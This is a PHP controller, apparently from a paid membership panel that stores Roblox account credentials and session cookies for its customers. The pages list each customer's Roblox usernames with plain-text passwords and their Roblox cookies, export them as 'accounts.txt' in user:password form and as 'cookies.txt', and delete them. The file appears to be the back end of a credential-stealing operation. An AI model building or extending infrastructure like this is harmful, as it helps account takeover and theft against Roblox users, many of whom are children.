<?php

//Coded By Jitler
namespace app\controller;

use think\facade\View;
use think\facade\Session;
use think\facade\Request;
use app\http\middleware\AuthCheck;
use app\http\middleware\DiscordVerifyCheck;
use app\http\middleware\BlacklistCheck;
use app\http\middleware\MembershipCheck;
use app\model\UserModel;
use app\model\RbxAccountsModel;
use app\model\RbxCookiesModel;
class Storage
{

    //Private Functions
    protected $middleware = [AuthCheck::class,DiscordVerifyCheck::class,BlacklistCheck::class,MembershipCheck::class];

    private function getUserInfo()
    {
        $userid = Session::get("user_id");
        return UserModel::where("id", $userid)->find();
    }

    private function assignError($error, $viewassign, $view)
    {
        View::assign(array_merge($viewassign, [
            "error" => $error,
        ]));
        return View::fetch($view);
    }

    private function assignSuccess($success, $viewassign, $view)
    {
        View::assign(array_merge($viewassign, [
            "success" => $success,
        ]));
        return View::fetch($view);

    }

    private function handleDownloadAccounts($userid,$viewassign)
    {
        $rbxAccounts = RbxAccountsModel::where('ownerid', $userid)->order('id', 'desc') ->select();
        
        $fp = fopen('accounts.txt', 'w');
        foreach ($rbxAccounts as $row) {
            $accounts = [
                $row["rbx_username"],
                $row["rbx_password"],
            ];

            fwrite($fp, implode(":", $accounts) . "\n");
        }

        fclose($fp);

        // Set headers to force download of the file
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="accounts.txt"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize('accounts.txt'));

        readfile('accounts.txt');
        unlink('accounts.txt');
    }

    private function handleDownloadCookies($userid,$viewassign)
    {
        $rbxCookies = RbxCookiesModel::where('ownerid', $userid)->order('id', 'desc') ->select();
        
        $fp = fopen('cookies.txt', 'w');
        foreach ($rbxCookies as $row) {
            $cookies = array(
                $row["rbx_cookie"],
              );
            fwrite($fp, implode("", $cookies)."\n");
        }

        fclose($fp);

        // Set headers to force download of the file
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="cookies.txt"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize('cookies.txt'));

        readfile('cookies.txt');
        unlink('cookies.txt');
    }

    private function handleDeleteCookies($userid, $viewassign)
    {
        // Delete the records
        RbxCookiesModel::where('ownerid', $userid)->delete();

        // Fetch the updated records
        $rbxcookies = RbxCookiesModel::where('ownerid', $userid)->order('id', 'desc')->select();

        $viewassign["rbxcookies"] = $rbxcookies;

        // Return the updated view
        return $this->assignSuccess("Cookies Deleted.", $viewassign, "cookies-storage");
    }

    private function handleDeleteAccounts($userid, $viewassign)
    {
        // Delete the records
        RbxAccountsModel::where('ownerid', $userid)->delete();

        // Fetch the updated records
        $rbxAccounts = RbxAccountsModel::where('ownerid', $userid)->order('id', 'desc');

        // Updating the Pagination
        $currentPage = Request::param('page', 1);
        $perPage = 10; // Number of items per page
        $totalAccounts = $rbxAccounts->count();
        $totalPages = ceil($totalAccounts / $perPage);

        $rbxAccounts = $rbxAccounts->page($currentPage, $perPage)->select();

        $viewassign["rbxAccounts"] = $rbxAccounts;
        $viewassign["currentPage"] = $currentPage;
        $viewassign["totalPages"] = $totalPages;

        // Return the updated view
        return $this->assignSuccess("Accounts Deleted.", $viewassign, "accounts-storage");
    }


    //Public Functions Serve The Main Pages

    public function accounts()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 

            if ($usermembership !== 'Customer') {
                $expirationmessage = "Expire in $formatedexpire";
            } else {
                $expirationmessage = "No expiration date.";
            }
        } else {
            $expirationmessage = "No expiration date.";
        }


        $rbxAccounts = RbxAccountsModel::where('ownerid', $user->id)->order('id', 'desc');

        // Pagination
        $currentPage = Request::param('page', 1);
        $perPage = 10; // Number of items per page
        $totalAccounts = $rbxAccounts->count();
        $totalPages = ceil($totalAccounts / $perPage);

        $rbxAccounts = $rbxAccounts->page($currentPage, $perPage)->select();

        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "membership_expiration" => $expirationmessage,
            "profile_pic" => $user->profile_pic,
            "rbxAccounts" => $rbxAccounts,
            "currentPage" => $currentPage,
            "totalPages" => $totalPages,
            'orgin' => Request::server("HTTP_ORIGIN"),
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
        ];

        if (Request::isPost() && Request::has("download-accounts")) {
            return $this->handleDownloadAccounts($user->id, $viewassign);
        }

        if (Request::isPost() && Request::has("delete-accounts")) {
            return $this->handleDeleteAccounts($user->id, $viewassign);
        }

        View::assign($viewassign);
        return View::fetch("accounts-storage");
    }


    public function cookies()
    {
        $user = $this->getUserInfo();
        $userexpiration = $user->membership_expiration;
        $usermembership = $user->membership;

        $expirationmessage = '';

        if ($userexpiration) {
            $expirationDate = new \DateTime($userexpiration);
            $formatedexpire = $expirationDate->format('M j, Y'); 

            if ($usermembership !== 'Customer') {
                $expirationmessage = "Expire in $formatedexpire";
            } else {
                $expirationmessage = "No expiration date.";
            }
        } else {
            $expirationmessage = "No expiration date.";
        }


        $rbxCookies = RbxCookiesModel::where('ownerid', $user->id)->order('id', 'desc') ->select();

        $viewassign = [
            "username" => $user->username,
            "membership" => $user->membership,
            "membership_expiration" => $expirationmessage,
            "profile_pic" => $user->profile_pic,
            "rbxcookies" => $rbxCookies,
            "discord_server_link" => config("app.discord_server_link"),
            "app_name" => config("app.app_name"),
            "app_image" => config("app.app_image"),
        ];

        if (Request::isPost() && Request::has("download-cookies")) {
            return $this->handleDownloadCookies($user->id, $viewassign);
        }

        if (Request::isPost() && Request::has("delete-cookies")) {
            return $this->handleDeleteCookies($user->id, $viewassign);
        }
        
        View::assign($viewassign);
        return View::fetch("cookies-storage");
    }

}
